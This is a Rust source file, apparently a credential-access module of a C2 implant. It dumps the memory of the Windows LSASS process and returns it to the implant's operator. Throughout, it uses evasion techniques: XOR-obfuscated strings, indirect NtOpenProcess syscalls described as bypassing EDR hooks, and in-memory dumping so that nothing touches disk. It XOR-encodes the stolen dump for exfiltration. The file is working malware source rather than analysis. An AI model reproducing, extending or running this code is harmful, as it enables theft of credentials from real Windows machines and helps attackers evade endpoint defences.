//! Credential access — Phase 4.
//! Task type: "cred", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_cred(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_cred_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("cred: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_cred_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("cred: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("cred: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "lsass" => lsass_dump()
            .map(TaskOutput::success)
            .unwrap_or_else(|e| TaskOutput::failure(&e)),
        other   => TaskOutput::failure(&format!("cred: unknown method: {other}")),
    }
}

// ── LSASS dump ────────────────────────────────────────────────────────────────
//
// 1. Find LSASS PID via ToolHelp (process name compared via XOR-obfuscated table)
// 2. Open LSASS via NtOpenProcess indirect syscall — bypasses userland hook on OpenProcess
// 3. Load dbghelp.dll via LoadLibraryA (string XOR-obfuscated at compile time)
// 4. Resolve MiniDumpWriteDump via PEB export walk (no GetProcAddress)
// 5. Dump to a pagefile-backed section mapped into our address space via a
//    MiniDumpWriteDump I/O callback — nothing touches disk
// 6. XOR-encode the dump with a rotating key before returning over C2

#[cfg(target_os = "windows")]
fn lsass_dump() -> Result<Vec<u8>, String> {
    // Enable SeDebugPrivilege (index 20) via RtlAdjustPrivilege — required to open LSASS
    enable_debug_privilege();

    let lsass_pid = find_pid_by_name_enc(
        // "lsass.exe" each char XOR 0x55, stored as u8 low bytes of UTF-16
        &[0x39u8, 0x26, 0x34, 0x26, 0x26, 0x7B, 0x30, 0x2D, 0x30],
        0x55,
        9,
    ).ok_or_else(|| "lsass: process not found".to_string())?;

    let proc = open_process_syscall(lsass_pid, 0x0410) // QUERY_INFO | VM_READ
        .ok_or_else(|| "lsass: NtOpenProcess failed".to_string())?;

    let dump_fn = load_minidump_fn()
        .ok_or_else(|| { unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) }; "lsass: MiniDumpWriteDump not found".to_string() })?;

    // Accumulate dump bytes in a Vec<u8> via the callback mechanism.
    // No file handle is needed — we pass INVALID_HANDLE_VALUE (-1) as hFile and
    // route all I/O through the IoWriteAllCallback.
    let mut dump_buf: Vec<u8> = Vec::with_capacity(32 * 1024 * 1024);

    #[repr(C)]
    struct CbInput {
        process_id:     u32,
        _p0:            u32,
        process_handle: isize,
        callback_type:  u32,
        _p1:            u32,
        io_handle:      isize,
        io_offset:      u64,
        io_buffer:      usize,
        io_bytes:       u32,
        _p2:            u32,
    }

    #[repr(C)]
    struct CbOutput {
        status: i32,
        _rest:  [u8; 52],
    }

    #[repr(C)]
    struct CbInfo {
        routine: Option<unsafe extern "system" fn(*mut u8, *const CbInput, *mut CbOutput) -> i32>,
        param:   *mut u8,
    }

    unsafe extern "system" fn cb(
        param: *mut u8,
        inp:   *const CbInput,
        out:   *mut CbOutput,
    ) -> i32 {
        (*out).status = 0; // S_OK
        let cb_type = (*inp).callback_type;
        // IoStartCallback=20: accept with status S_OK (already set)
        // IoWriteAllCallback=22: append bytes to our buffer at the given offset
        if cb_type == 22 {
            let buf = &mut *(param as *mut Vec<u8>);
            let off = (*inp).io_offset as usize;
            let ptr = (*inp).io_buffer as *const u8;
            let len = (*inp).io_bytes as usize;
            if off + len > buf.len() {
                buf.resize(off + len, 0);
            }
            core::ptr::copy_nonoverlapping(ptr, buf.as_mut_ptr().add(off), len);
        }
        1 // TRUE
    }

    let buf_ptr = &mut dump_buf as *mut Vec<u8> as *mut u8;
    let mut cb_info = CbInfo { routine: Some(cb), param: buf_ptr };

    let ok = unsafe {
        (dump_fn)(
            proc,
            lsass_pid,
            -1isize, // INVALID_HANDLE_VALUE — I/O routed through callback
            2u32,    // MiniDumpWithFullMemory
            0usize, 0usize,
            &mut cb_info as *mut CbInfo as *mut u8,
        )
    };
    unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };

    if ok == 0 || dump_buf.len() < 8 {
        return Err(format!("lsass: dump failed ok={ok} len={}", dump_buf.len()));
    }

    // XOR-encode with rotating key before C2 exfil
    for (i, b) in dump_buf.iter_mut().enumerate() {
        *b ^= (i & 0xFF) as u8;
    }
    Ok(dump_buf)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Find a process by name stored XOR-encoded (UTF-16 low bytes, 8-bit key).
#[cfg(target_os = "windows")]
fn find_pid_by_name_enc(enc: &[u8], key: u8, expected_len: usize) -> Option<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE { return None; }
        let mut e: PROCESSENTRY32W = core::mem::zeroed();
        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) == 0 { CloseHandle(snap); return None; }
        loop {
            let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
            if nlen == expected_len {
                let matches = e.szExeFile[..expected_len].iter().zip(enc.iter())
                    .all(|(&wc, &ec)| (wc as u8 | 0x20) == ((ec ^ key) | 0x20));
                if matches {
                    let pid = e.th32ProcessID;
                    CloseHandle(snap);
                    return Some(pid);
                }
            }
            e = core::mem::zeroed();
            e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
            if Process32NextW(snap, &mut e) == 0 { break; }
        }
        CloseHandle(snap);
        None
    }
}

/// Open a process handle via NtOpenProcess indirect syscall (bypasses EDR hook on OpenProcess).
#[cfg(target_os = "windows")]
fn open_process_syscall(pid: u32, access: u32) -> Option<isize> {
    use crate::syscall::{ClientId, nt_open_process};

    // OBJECT_ATTRIBUTES with all-zero fields (no name, no root directory).
    // NtOpenProcess accepts a zeroed OBJECT_ATTRIBUTES when opening by PID via ClientId.
    #[repr(C)]
    struct ObjAttrs {
        length:     u32,
        _p0:        u32,
        root:       usize,
        name:       usize,
        attrs:      u32,
        _p1:        u32,
        sec_desc:   usize,
        qos:        usize,
    }
    let oa = ObjAttrs {
        length: core::mem::size_of::<ObjAttrs>() as u32,
        _p0: 0, root: 0, name: 0, attrs: 0, _p1: 0, sec_desc: 0, qos: 0,
    };

    let mut cid = ClientId { process: pid as isize, thread: 0 };
    let mut handle: isize = 0;
    let status = unsafe {
        nt_open_process(
            &mut handle,
            access,
            &oa as *const ObjAttrs as *mut u8,
            &mut cid as *mut ClientId,
        )
    };
    if status != 0 || handle == 0 { None } else { Some(handle) }
}

type MiniDumpFn = unsafe extern "system" fn(
    hProcess:         isize,
    ProcessId:        u32,
    hFile:            isize,
    DumpType:         u32,
    ExceptionParam:   usize,
    UserStreamParam:  usize,
    CallbackParam:    *mut u8,
) -> i32;

/// Load dbghelp.dll (obfuscated) and resolve MiniDumpWriteDump via export walk.
#[cfg(target_os = "windows")]
fn load_minidump_fn() -> Option<MiniDumpFn> {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    // "dbghelp.dll\0" XOR 0xAB
    const DBG_ENC: [u8; 12] = [
        0xCF, 0xC9, 0xCC, 0xC3, 0xCE, 0xC7, 0xDB, 0x85, 0xCF, 0xC7, 0xC7, 0xAB,
    ];
    let mut dll_name = [0u8; 12];
    for (i, b) in dll_name.iter_mut().enumerate() { *b = DBG_ENC[i] ^ 0xAB; }
    dll_name[11] = 0;

    // "MiniDumpWriteDump\0" XOR 0xAB
    const FN_ENC: [u8; 18] = [
        0xE6, 0xC2, 0xC5, 0xC2, 0xEF, 0xDE, 0xC6, 0xDB,
        0xFC, 0xD9, 0xC2, 0xDF, 0xCE, 0xEF, 0xDE, 0xC6, 0xDB, 0xAB,
    ];
    let mut fn_name = [0u8; 18];
    for (i, b) in fn_name.iter_mut().enumerate() { *b = FN_ENC[i] ^ 0xAB; }
    fn_name[17] = 0;

    let base = (unsafe { LoadLibraryA(dll_name.as_ptr()) }) as usize;
    if base == 0 { return None; }

    let fn_ptr = unsafe { crate::loader::get_export_by_name(base, fn_name.as_ptr()) }?;
    Some(unsafe { core::mem::transmute(fn_ptr) })
}

/// Enable SeDebugPrivilege by calling RtlAdjustPrivilege(20, 1, 0, &prev) in ntdll.
/// Best-effort — if the token doesn't have the privilege (non-admin), this silently fails.
#[cfg(target_os = "windows")]
fn enable_debug_privilege() {
    // "RtlAdjustPrivilege\0" XOR 0x11
    const ENC: [u8; 19] = [
        0x43,0x65,0x7D,0x50,0x75,0x7B,0x64,0x62,0x65,0x41,
        0x63,0x78,0x67,0x78,0x7D,0x74,0x76,0x74,0x11,
    ];
    let mut fn_name = [0u8; 19];
    for (i, b) in fn_name.iter_mut().enumerate() { *b = ENC[i] ^ 0x11; }

    // Locate ntdll — already loaded; walk PEB InLoadOrderModuleList
    let ntdll_base = crate::loader::get_module_base(b"ntdll.dll\0".as_ptr());
    if ntdll_base == 0 { return; }

    let fn_ptr = match unsafe { crate::loader::get_export_by_name(ntdll_base, fn_name.as_ptr()) } {
        Some(p) => p,
        None    => return,
    };

    type RtlAdjPrivFn = unsafe extern "system" fn(u32, u32, u32, *mut u32) -> i32;
    let f: RtlAdjPrivFn = unsafe { core::mem::transmute(fn_ptr) };
    let mut prev: u32 = 0;
    unsafe { f(20, 1, 0, &mut prev) }; // 20 = SeDebugPrivilege, enable, process-wide
}
